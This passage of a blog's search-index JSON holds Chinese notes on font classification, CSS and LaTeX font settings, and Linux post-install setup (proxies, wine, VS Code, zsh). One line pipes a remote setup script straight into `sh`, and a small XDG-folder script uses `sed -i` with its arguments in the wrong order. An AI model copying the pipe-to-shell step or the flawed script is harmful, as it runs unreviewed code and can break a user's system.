\u7b49\u5bbd\u5b57\u4f53\uff0c\u4e5f\u53ebtypewrite\u5b57\u4f53\u3002 \u5b83\u4eec\u901a\u5e38\u7528\u4e8e\u6a21\u62df\u6253\u5b57\u673a\u6253\u51fa\u7684\u6587\u672c\u3001\u8001\u5f0f\u70b9\u9635\u6253\u5370\u673a\u7684\u8f93\u51fa\uff0c\u751a\u81f3\u66f4\u8001\u5f0f\u7684\u89c6\u9891\u663e\u793a\u7ec8\u7aef\u3002\u53ef\u4ee5\u6709\u886c\u7ebf\u6216\u6ca1\u6709\u886c\u7ebf\u3002Monospace \u5b57\u4f53\u7684\u4f8b\u5b50\u5305\u62ecCourier New, Consolas\u3002 </p> </li> <li> <p>Cursive \u5b57\u4f53:  \u8fd9\u4e9b\u5b57\u4f53\u8bd5\u56fe\u6a21\u4eff\u4eba\u7684\u624b\u5199\u4f53\u3002Cursive \u5b57\u4f53\u7684\u4f8b\u5b50\u5305\u62ec Zapf Chancery\u3001Author \u548c Comic Sans\u3002 </p> </li> <li> <p>Fantasy \u5b57\u4f53:  \u5f62\u72b6\u662f\u7279\u522b\u8bbe\u8ba1\u7684\uff0c\u4f46\u4ecd\u7136\u8868\u793a\u5b57\u7b26\u3002\u8fd9\u6837\u7684\u5b57\u4f53\u5305\u62ec Latin fontsAlpha Geometrique, Critter, Cottonwood, FB Reactor, Studz\u3002</p> </li> </ul> <p>Fantasy fonts, as used in CSS, are primarily decorative while still containing representations of characters (as opposed to Pi or Picture fonts, which do not represent characters).  </p> <p>\u672f\u8bedtypeface\u4e5f\u8868\u793afont family\u7684\u610f\u601d</p>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-style","title":"font style","text":"<p>\u5b57\u4f53\u6837\u5f0f(font style)\u7528\u4e8e\u5f3a\u8c03(highlight)\u6587\u6863\u4e2d\u7684\u91cd\u8981\u6982\u5ff5\uff0c\u4f7f\u5176\u53d8\u5f97\u66f4\u52a0\u53ef\u8bfb\u3002</p> <p>\u5e38\u89c1\u7684\u6837\u5f0f\u6709</p> <ul> <li> <p>bold</p> </li> <li> <p>italic</p> </li> </ul> <p>In European typefaces, especially Roman ones, a slope or slanted style is used to emphasize important words. This is called italic type or oblique type.  </p> <p>'italic' is commonly used to label slanted text, but slanted text may also be labeled as being Oblique, Slanted, Incline, Cursive or Kursiv.  </p> <ul> <li>underlined</li> </ul>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-weight","title":"font weight","text":"<p>\u5b57\u4f53\u7c97\u7ec6(font weight)\u6709\u4e0d\u540c\u7684\u5206\u7c7b\u65b9\u6cd5\u3002</p> <p>Attempts to systematize a range of weights led to a numerical classification first used by Adrian Frutiger with the Univers typeface: 35 Extra Light, 45 Light, 55 Medium or Regular, 65 Bold, 75 Extra Bold, 85 Extra Bold, 95 Ultra Bold or Black.  </p> <p>The TrueType font format introduced a scale from 100 through 900, which is also used in CSS and OpenType, where 400 is regular (roman or plain). </p> <p>The Mozilla Developer Network provides the following rough mapping[3] to typical font weight names: </p> Names Numerical values Thin / Hairline 100 Ultra-light / Extra-light 200 Light 300 Normal / regular 400 Medium 500 Semi-bold / Demi-bold 600 Bold 700 Extra-bold / Ultra-bold 800 Extra-black / Ultra-black 950 Heavy / Black 900","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-size","title":"font size","text":"<p>\u5b57\u4f53\u5927\u5c0f(font size)\u4e5f\u53eb\u5b57\u53f7\uff0c\u5355\u4f4d\u4e3apt</p> <p>One such scheme, invented and popularized by Adobe Systems, refers to the variant fonts by the applications they are typically used for, with the exact point sizes intended varying slightly by typeface: </p> Poster Extremely large sizes, usually larger than 72 point Display Large sizes, typically 19\u201372 point Subhead Large text, typically about 14\u201318 point (Regular) Usually left unnamed, typically about 10\u201313 point Small Text (SmText) Typically about 8\u201310 point Caption Very small, typically about 4\u20138 point","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#css\u4e2d\u8bbe\u7f6e\u5b57\u4f53","title":"css\u4e2d\u8bbe\u7f6e\u5b57\u4f53","text":"","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-\u5c5e\u6027","title":"font-*\u5c5e\u6027","text":"<ul> <li>font-family</li> </ul> <p>serif | sans-serif | monospace | cursive | fantasy | \u5177\u4f53typeface</p> <p>\u53ef\u4ee5\u6307\u5b9a\u591a\u4e2a\uff0c\u7528\u9017\u53f7\u9694\u5f00\uff0c\u524d\u9762\u7684\u4f18\u5148\u7ea7\u9ad8\u3002\u63a8\u8350\u5148\u5199\u5177\u4f53\u5b57\u4f53\uff0c\u7ed3\u5c3e\u8865\u5145\u4e00\u4e2a\u901a\u7528font family\u3002\u5982font-family: Arial, sans-serif;</p> <ul> <li>font-style</li> </ul> <p>normal | italic | oblique </p> <ul> <li>font-variant</li> </ul> <p>normal | small-caps</p> <ul> <li> <p>font-weight   normal | bold | bolder | lighter | 100 | 200 | 300 | 400 | 500 | 600 | 700 | 800 | 900  </p> </li> <li> <p>font-size</p> </li> </ul> <p>\u7565</p>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font\u5c5e\u6027","title":"font\u5c5e\u6027","text":"<p>\u4f9d\u6b21\u8bbe\u7f6efont-style, font-variant, font-weight, font-size/line-height, font-family</p> <pre><code>font:italic bold 12px/30px arial,sans-serif;\n</code></pre>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#latex\u4e2d\u8bbe\u7f6e\u5b57\u4f53","title":"LaTex\u4e2d\u8bbe\u7f6e\u5b57\u4f53","text":"","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-size-style-family","title":"Font size, style, family","text":"Command Output \\tiny \\scriptsize \\footnotesize \\small \\normalsize \\large \\Large \\LARGE \\huge \\Huge <p>Font styles</p> style command switch command output medium <code>\\textmd{Sample Text 0123}</code> <code>\\mdseries</code> bold <code>\\textbf{Sample Text 0123}</code> <code>\\bfseries</code> upright <code>\\textup{Sample Text 0123}</code> <code>\\upshape</code> italic <code>\\textit{Sample Text 0123}</code> <code>\\itshape</code> slanted <code>\\textsl{Sample Text 0123}</code> <code>\\slshape</code> small caps <code>\\textsc{Sample Text 0123}</code> <code>\\scshape</code> <p>Default font families</p> typeface = family command switch command output serif (roman) <code>\\textrm{Sample Text 0123}</code> <code>\\rmfamily</code> sans serif <code>\\textsf{Sample Text 0123}</code> <code>\\sffamily</code> typewriter (monospace) <code>\\texttt{Sample Text 0123}</code> <code>\\ttfamily</code>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#underlined-emphasising","title":"Underlined, emphasising","text":"<p>Underlining text is very simple too, use the \\underline command:</p> <pre><code>Some of the greatest \ndiscoveries in \\underline{science} \nwere made by accident.\n</code></pre> <p></p> <p>Text can be emphasized by using \\emph command. Sometimes the \\emph command behaves just as \\textit, but is not exactly the same: </p> <pre><code>Some of the greatest \\emph{discoveries} \nin science \nwere made by accident.\n\n\\textit{Some of the greatest \\emph{discoveries} \nin science \nwere made by accident.}\n\n\\textbf{Some of the greatest \\emph{discoveries} \nin science \nwere made by accident.}\n</code></pre> <p></p>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#supporting-modern-fonts-with-xelatex","title":"Supporting modern fonts with XeLaTeX","text":"<p>Even though LATEX provides an extensive set of fonts, you may want to use an an external font you really like and you have already installed system-wide, this is possible with XeTeX. XeTeX is a TEX typesetting engine using Unicode and supporting modern font technologies such as OpenType (OTF), TrueType (TTF), Graphite, and Apple Advanced Typography (AAT). The corresponding compilers are <code>xetex</code> and <code>xelatex</code>. </p> <p>\u4ee5\u4e0b\u4ee3\u7801\u4e3a3\u79cd\u901a\u7528\u5b57\u4f53\u5bb6\u65cf\u8bbe\u7f6e\u4e86\u9ed8\u8ba4\u7684\u5b57\u4f53\u3002</p> <pre><code>\\usepackage{fontspec}\n\n\n  %This would work on a standard latex installation, (your local computer) \n  %-----------------------------------------------------------------------\n  \\setromanfont{Times New Roman}\n  \\setsansfont{Arial}\n  \\setmonofont[Color={0019D4}]{Courier New}\n  %-----------------------------------------------------------------------\n</code></pre> <p>\u4ee5\u4e0b\u4ee3\u7801\u4f7f\u7528\u5b57\u4f53\u6587\u4ef6\u8bbe\u7f6e\u5b57\u4f53 <pre><code>\\usepackage{fontspec}\n\n\n% Times New Roman\n\\setromanfont[\nBoldFont=timesbd.ttf,\nItalicFont=timesi.ttf,\nBoldItalicFont=timesbi.ttf,\n]{times.ttf}\n% Arial\n\\setsansfont[\nBoldFont=arialbd.ttf,\nItalicFont=ariali.ttf,\nBoldItalicFont=arialbi.ttf\n]{arial.ttf}\n% Courier New\n\\setmonofont[Scale=0.90,\nBoldFont=courbd.ttf,\nItalicFont=couri.ttf,\nBoldItalicFont=courbi.ttf,\nColor={0019D4}\n]{cour.ttf}\n</code></pre></p>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#\u53c2\u8003\u6587\u732e","title":"\u53c2\u8003\u6587\u732e","text":"<ol> <li>Wikipedia: font</li> <li>W3C: fonts</li> <li>Overleaf: Font sizes, families, and styles</li> <li>Overleaf: Bold, italics and underlining</li> <li>Overleaf: Supporting modern fonts with XeLaTeX</li> </ol>","tags":["\u5b57\u4f53"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/","title":"\u5b89\u88c5linux\u540e\u7684\u914d\u7f6e","text":"<ul> <li>\u6982\u8ff0</li> <li>\u5e38\u7528\u8f6f\u4ef6<ul> <li>\u4e2d\u6587\u8f93\u5165\u6cd5<ul> <li>\"\u684c\u9762\"\u6539\u4e3a\"Desktop\"</li> <li>\u66f4\u6539xdg-user-dirs</li> </ul> </li> <li>\u4ee3\u7406</li> <li>\u8c37\u6b4c\u6d4f\u89c8\u5668</li> <li>wine<ul> <li>qq</li> </ul> </li> <li>VS Code</li> <li>\u5176\u5b83\u5de5\u5177<ul> <li>gparted</li> </ul> </li> </ul> </li> <li>\u547d\u4ee4\u884c<ul> <li>\u8f6f\u4ef6</li> <li>\u81ea\u52a8\u914d\u7f6e</li> <li>.bashrc</li> <li>vim<ul> <li>vim\u7c98\u8d34\u65f6\u5173\u95ed\u81ea\u52a8\u7a7a\u683c</li> </ul> </li> <li>zsh<ul> <li>oh-my-zsh\u624b\u52a8\u5b89\u88c5</li> <li>\u5b89\u88c5oh-my-zsh\u5e76\u5b89\u88c5\u63d2\u4ef6<ul> <li>zsh-autosuggestions</li> <li>zsh-syntax-highlighting</li> <li>autojump</li> </ul> </li> </ul> </li> <li>fzf<ul> <li>\u95ee\u9898</li> </ul> </li> <li>tmux(.tmux(oh-my-tmux))<ul> <li>\u4fee\u6539</li> </ul> </li> <li>zplug<ul> <li>\u4f7f\u7528</li> <li>\u5bfb\u627e\u63d2\u4ef6</li> </ul> </li> <li>\u81ea\u5b9a\u4e49prompt<ul> <li>bash</li> <li>zsh<ul> <li>Customized</li> </ul> </li> </ul> </li> </ul> </li> <li>\u7f8e\u5316<ul> <li>Ubuntu</li> </ul> </li> <li>\u670d\u52a1<ul> <li>sshd</li> <li>vnc</li> </ul> </li> <li>\u5e38\u7528\u64cd\u4f5c\u53c2\u8003<ul> <li>apt\u76f8\u5173<ul> <li>apt\u6362\u6e90</li> <li>apt-get\u4e34\u65f6\u4f7f\u7528sock\u4ee3\u7406</li> </ul> </li> <li>bash\u8bbe\u7f6e\u4ee3\u7406</li> <li>git\u8bbe\u7f6e\u4ee3\u7406</li> <li>\u6062\u590d\u9ed8\u8ba4.bashrc</li> <li>vim\u590d\u5236\u7c98\u8d34\uff08\u7cfb\u7edf\u526a\u8d34\u677f\uff09<ul> <li>\u89e3\u91ca</li> </ul> </li> <li>vim redo</li> <li>ssh\u7684\u6709\u7528\u529f\u80fd<ul> <li>\u6b63\u5411\u8f6c\u53d1</li> <li>\u8fdc\u7a0b\u673a\u901a\u8fc7\u672c\u5730\u673a\u4ee3\u7406\u4e0a\u7f51\uff08\u53cd\u5411\u4ee3\u7406\uff09</li> </ul> </li> </ul> </li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u4e0d\u60f3\u6bcf\u6b21\u914d\u7f6elinux\u90fd\u9700\u8981\u91cd\u65b0\u53bb\u641c\u7d22\uff0c\u56e0\u6b64\u5728\u81ea\u5df1\u5e73\u65f6\u6298\u817e\u65f6\u987a\u4fbf\u8bb0\u5f55\u4e00\u4e0b\uff08\u957f\u671f\u66f4\u65b0\uff09</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u5e38\u7528\u8f6f\u4ef6","title":"\u5e38\u7528\u8f6f\u4ef6","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u4e2d\u6587\u8f93\u5165\u6cd5","title":"\u4e2d\u6587\u8f93\u5165\u6cd5","text":"<p>\u53c2\u8003\uff1a - ubuntu22.04 https://muzing.top/posts/3fc249cf/#%E5%89%8D%E8%A8%80</p> <p>\u5982\u679c\u5b89\u88c5\u7cfb\u7edf\u65f6\u9009\u62e9\u4e86\u4e2d\u6587\uff0c\u5219\u81ea\u5e26\u4e00\u4e2a\u4e2d\u6587\u8f93\u5165\u6cd5\u3002\u800c\u5982\u679c\u9009\u62e9\u4e86\u82f1\u6587\uff0c\u540e\u9762\u60f3\u6539\u6210\u4e2d\u6587\u3002\u53ef\u4ee5\uff1a 1. \u5c06\u8bbe\u7f6e\u4e2d\u7684\u533a\u57df\u548c\u8bed\u8a00\u6539\u4e3a\u4e2d\u6587\u3002 2. \u6253\u5f00language support\uff0c\u7b2c\u4e00\u6b21\u6253\u5f00\u4f1a\u663e\u793a\u8bed\u8a00\u652f\u6301\u6ca1\u6709\u5b8c\u5168\u5b89\u88c5\uff0c\u4f1a\u5b89\u88c5\u4e2d\u6587\u5b57\u4f53\u7b49\u3002</p> <p>\u4e0b\u8f7d\u8c37\u6b4c\u62fc\u97f3\u8f93\u5165\u6cd5</p> <pre><code>sudo apt-get install fcitx-googlepinyin\n</code></pre> <p>\u7136\u540e\u5728language support\u4e2d\u5c06Keyboard input method\u4ece\u9ed8\u8ba4\u7684iBus\u6539\u6210fcitx\uff0c\u91cd\u542f\u7535\u8111\u3002</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u684c\u9762\u6539\u4e3adesktop","title":"\"\u684c\u9762\"\u6539\u4e3a\"Desktop\"","text":"<p>ubuntu</p> <pre><code>export LANG=en_US\nxdg-user-dirs-gtk-update\n</code></pre> <p>\u9009\u62e9\u66f4\u65b0\u540d\u79f0</p> <pre><code>export LANG=zh_CN\nxdg-user-dirs-gtk-update\n</code></pre> <p>\u9009\u62e9\u4fdd\u7559\u540d\u79f0\uff0c\u5e76\u4e0d\u518d\u63d0\u9192</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u66f4\u6539xdg-user-dirs","title":"\u66f4\u6539xdg-user-dirs","text":"<ul> <li>xdg\u5168\u5c40\u914d\u7f6e\u6587\u4ef6\uff1a<code>/etc/xdg/user-dirs.conf</code>\u548c<code>/etc/xdg/user-dirs.defaults</code></li> <li>\u4fee\u6539\u7528\u6237\u914d\u7f6e\u6587\u4ef6<code>$HOME/.config/user-dirs.dirs</code> <pre><code>XDG_DOWNLOAD_DIR=\"$HOME/downloads/Downloads\"\nXDG_DESKTOP_DIR=\"$HOME/downloads/Desktop\"\nXDG_TEMPLATES_DIR=\"$HOME/downloads/Templates\"\nXDG_PUBLICSHARE_DIR=\"$HOME/downloads/Public\"\nXDG_DOCUMENTS_DIR=\"$HOME/downloads/Documents\"\nXDG_MUSIC_DIR=\"$HOME/downloads/Music\"\nXDG_PICTURES_DIR=\"$HOME/downloads/Pictures\"\nXDG_VIDEOS_DIR=\"$HOME/downloads/Videos\"\n</code></pre></li> <li>\uff08\u91cd\u8981\uff09\u521b\u5efa\u5bf9\u5e94\u76ee\u5f55\uff0c\u5426\u5219\u91cd\u542f\u540e\u4e0a\u8ff0\u914d\u7f6e\u4f1a\u6307\u5411<code>$HOME/</code> <pre><code>#!env bash\nPREFIX=$HOME/downloads\n\nDIRs=\"Downloads Desktop Templates Public Documents Music Pictures Videos\"\nfor dir in $DIRs; do\n    rm -d $HOME/$dir\n    mkdir $PREFIX/$dir\n    sed -i $HOME/.config/user-dirs.dirs 's/$HOME\\/'$dir'/'$PREFIX'\\/'$dir\ndone\n</code></pre></li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u4ee3\u7406","title":"\u4ee3\u7406","text":"<ul> <li>\u4f7f\u7528qv2ray</li> <li>\u5728github\u4e0a\u4e0b\u8f7dqv2ray, v2ray</li> <li>\u914d\u7f6eqv2ray core</li> <li>\u5bfc\u5165\u94fe\u63a5</li> </ul> <p>\u5177\u4f53\u53c2\u8003https://qv2ray.net/getting-started/</p> <p>\u6ce8\uff1a\u76ee\u524d\u7248\u672c(2.6.3)\uff0c\u5728\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f\u52a8\u540e\uff0c\u53f3\u4e0a\u89d2\u7684qv2ray\u56fe\u6807\u4f1a\u6d88\u5931\uff0c\u5bfc\u81f4\u65e0\u6cd5\u65ad\u5f00\u8fde\u63a5\u975e\u5e38\u9ebb\u70e6\u3002\u89e3\u51b3\u529e\u6cd5\u4e3a\u53d6\u6d88\u5f00\u673a\u81ea\u542f\u52a8\u5e76\u91cd\u65b0\u5b89\u88c5\uff08\u6570\u636e\u4ecd\u7136\u4f1a\u4fdd\u7559\uff0c\u6545\u4e0d\u5fc5\u62c5\u5fc3\u3002\u5378\u8f7d\u540e\u9700\u8981\u91cd\u542f\u6216\u6ce8\u9500\u4e00\u4e0b\u8d26\u6237\uff0c\u7136\u540e\u624d\u80fd\u91cd\u88c5\uff0c\u5426\u5219\u4ecd\u7136\u4e0d\u663e\u793a\uff09</p> <ul> <li> <p>\u4f7f\u7528clash for windows</p> </li> <li> <p>\u4f7f\u7528flatpak\u5b89\u88c5\u5373\u53ef     <pre><code>flatpak install io.github.Fndroid.clash_for_windows\n</code></pre></p> </li> <li> <p>\u65e7\u65b9\u6cd5</p> </li> <li> <p>\u4e0b\u8f7dReleases \u00b7 Fndroid/clash_for_windows_pkg \u00b7 GitHub</p> </li> <li> <p>\u89e3\u538b\u540e\u547d\u4ee4\u884c\u8fd0\u884ccfw</p> <p>\uff08\u4e0d\u77e5\u9053\u6709\u4ec0\u4e48\u529e\u6cd5\u628a\u8be5\u7a0b\u5e8f\u56fa\u5b9a\u5230\u4efb\u52a1\u680f\uff09</p> </li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u8c37\u6b4c\u6d4f\u89c8\u5668","title":"\u8c37\u6b4c\u6d4f\u89c8\u5668","text":"<ul> <li> <p>\u4f7f\u7528chromium\uff08chromium\u4e5f\u53ef\u4ee5\u4f7f\u7528google\u5e10\u53f7\u8fdb\u884c\u540c\u6b65\uff09</p> <pre><code>sudo apt install chromium-browser\n</code></pre> </li> <li> <p>\u4f7f\u7528google chrome</p> <pre><code>wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\ncd /path\nsudo apt install ./google-chrome-stable_current_amd64.deb\n</code></pre> </li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#wine","title":"wine","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#qq","title":"qq","text":"<pre><code>wget -O- https://deepin-wine.i-m.dev/setup.sh | sh\nsudo apt-get install deepin.com.qq.im\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#vs-code","title":"VS Code","text":"<p>https://code.visualstudio.com/docs/setup/linux</p> <ol> <li>download deb</li> </ol> <p>Download Visual Studio Code - Mac, Linux, Windows</p> <pre><code>sudo apt install ./&lt;file&gt;.deb\n</code></pre> <ol> <li>add apt repo</li> </ol> <pre><code>sudo apt install software-properties-common apt-transport-https wget\nwget -q https://packages.microsoft.com/keys/microsoft.asc -O- | sudo apt-key add -\nsudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\"\n\nsudo apt update\nsudo apt-get -o Acquire::http::proxy=\"socks5h://127.0.0.1:1089/\" install code #\u7ea670MB\n</code></pre> <ol> <li>snap or Ubuntu software</li> </ol> <p>\u8f6f\u4ef6\u5360\u7528\u7a7a\u95f4\u66f4\u5927</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u5176\u5b83\u5de5\u5177","title":"\u5176\u5b83\u5de5\u5177","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#gparted","title":"gparted","text":"<pre><code>sudo apt install gparted\n</code></pre> <p>\u4f7f\u7528\u8be5\u8f6f\u4ef6\u8fdb\u884c\u5206\u533a</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u547d\u4ee4\u884c","title":"\u547d\u4ee4\u884c","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u8f6f\u4ef6","title":"\u8f6f\u4ef6","text":"<pre><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak\nsudo sed -i 's@//.*archive.ubuntu.com@//mirrors.ustc.edu.cn@g' /etc/apt/sources.list\nsudo apt update\n\nsudo apt install vim git wget zsh htop net-tools\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u81ea\u52a8\u914d\u7f6e","title":"\u81ea\u52a8\u914d\u7f6e","text":"<pre><code>sudo apt install wget curl git zsh tmux mtr htop bind9-dnsutils\n</code></pre> <pre><code>wget https://github.com/TheRainstorm/my-vim-config/raw/master/setup.sh \n# \u6216 https://raw.githubusercontent.com/TheRainstorm/my-vim-config/master/setup.sh\n\napt install zsh\nzsh\n\nsource setup.sh\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#bashrc","title":".bashrc","text":"<p>\u53ef\u4ee5\u8ba9bash\u548czsh\u5171\u7528\u540c\u4e00\u4e2aalias\u914d\u7f6e\u6587\u4ef6\u3002\u5728zshrc\u4e2d\u6dfb\u52a0</p> <pre><code>if [ -f ~/.bash_aliases ]; then\n    . ~/.bash_aliases\nfi\n</code></pre> <p>\u4e3b\u8981\u5185\u5bb9</p> <pre><code>alias t=\"tmux \"\nalias ra=\"ranger\"\nalias ca=\"conda activate \"\n\nexport proxy_addr=localhost\nexport proxy_http_port=11223\nexport proxy_socks_port=11223\nfunction set_proxy() {\n    export http_proxy=http://$proxy_addr:$proxy_http_port #\u5982\u679c\u4f7f\u7528git \u4e0d\u884c\uff0c\u8fd9\u4e24\u4e2ahttp\u548chttps\u6539\u6210socks5\u5c31\u884c\n    export https_proxy=http://$proxy_addr:$proxy_http_port\n    export all_proxy=socks5://$proxy_addr:$proxy_socks_port\n}\nfunction unset_proxy() {\n    unset http_proxy\n    unset https_proxy\n    unset all_proxy\n}\nfunction test_proxy() {\n    curl -v https://www.google.com 2&gt;&amp;1 | egrep 'HTTP/(2|1.1) 200'\n}\n\n# Prompt\nexport PROMPT=\"%B%n@%m $PROMPT\"\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#vim","title":"vim","text":"<ul> <li>\u6211\u7684\u914d\u7f6e\uff1ahttps://github.com/TheRainstorm/my-vim-config </li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#vim\u7c98\u8d34\u65f6\u5173\u95ed\u81ea\u52a8\u7a7a\u683c","title":"vim\u7c98\u8d34\u65f6\u5173\u95ed\u81ea\u52a8\u7a7a\u683c","text":"<ul> <li>\u53c2\u8003\uff1aconfiguration - Turning off auto indent when pasting text into vim - Stack Overflow <pre><code>:set paste    #paste\u6a21\u5f0f\uff0c\u4e34\u65f6\u5173\u95edautoindent\n:set nopaste\n</code></pre></li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#zsh","title":"zsh","text":"<p>\u5b89\u88c5oh-my-zsh\u65f6\u4f1a\u81ea\u52a8\u5c06zsh\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4shell</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#oh-my-zsh\u624b\u52a8\u5b89\u88c5","title":"oh-my-zsh\u624b\u52a8\u5b89\u88c5","text":"<p>\u901a\u5e38\u6765\u8bf4curl\u83b7\u5f97install\u811a\u672c\u65f6\u4f1a\u5361\u4f4f\uff0cgit clone\u4ed3\u5e93\u65f6\u4e5f\u53ef\u80fd\u5361\u4f4f\uff0c\u6b64\u65f6\u4e0d\u5982\u624b\u52a8\u5b89\u88c5\uff0c\u67e5\u770binstall\u811a\u672c\uff0c\u4f1a\u53d1\u73b0\u5176\u5b9e\u53ea\u505a\u4e86\u51e0\u4ef6\u4e8b\u60c5\uff1a - \u5c06oh-my-zsh\u4ed3\u5e93\u514b\u9686\u5230$HOME\u4e0b<code>.oh-my-zsh</code>   - \u53ef\u4ee5\u4ece\u5176\u4ed6\u8ba1\u7b97\u673ascp\u5230\u8def\u7531\u5668\u91cc - \u590d\u5236zshrc\u6587\u4ef6\uff1a<code>cp .oh-my-zsh/templates/zshrc.zsh-template 